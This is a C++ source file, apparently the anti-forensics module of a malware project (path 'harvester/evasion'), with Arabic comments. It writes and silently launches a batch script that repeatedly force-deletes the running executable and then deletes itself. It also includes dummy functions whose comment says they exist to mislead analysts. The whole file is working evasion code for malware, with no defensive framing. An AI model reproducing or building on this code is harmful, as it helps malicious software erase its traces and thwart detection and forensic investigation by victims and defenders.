// harvester/evasion/self_delete.cpp
// إصدار قوي – حذف الملف الذاتي بعد التنفيذ
#include "self_delete.h"
#include <windows.h>
#include <string>

void SelfDelete() {
    // الحصول على المسار الكامل للملف الحالي
    char modulePath[MAX_PATH];
    GetModuleFileNameA(NULL, modulePath, MAX_PATH);
    
    // إنشاء ملف بات مؤقت في نفس المجلد
    std::string batPath = std::string(modulePath) + ".bat";
    
    // محتوى ملف البات: حلقة تكرارية تحذف الملف المستهدف، ثم تحذف نفسها
    std::string content = 
        "@echo off\n"
        ":loop\n"
        "del \"" + std::string(modulePath) + "\" /f /q\n"
        "if exist \"" + std::string(modulePath) + "\" goto loop\n"
        "del \"" + batPath + "\" /f /q\n";
    
    // كتابة ملف البات
    HANDLE hFile = CreateFileA(batPath.c_str(), GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    
    DWORD written;
    WriteFile(hFile, content.c_str(), content.size(), &written, NULL);
    CloseHandle(hFile);
    
    // تشغيل ملف البات مخفياً
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    CreateProcessA(NULL, (LPSTR)batPath.c_str(), NULL, NULL,
                   FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    // إنهاء العملية الحالية (سيتم حذف الملف فوراً بواسطة البات)
    ExitProcess(0);
}

// دوال وهمية للتضليل
void DummySelfDeleteFunction1() {
    volatile int x = 0;
    for (int i = 0; i < 100; i++) x += i;
}

void DummySelfDeleteFunction2() {
    volatile char c = 0;
    for (int i = 0; i < 256; i++) c ^= (char)i;
}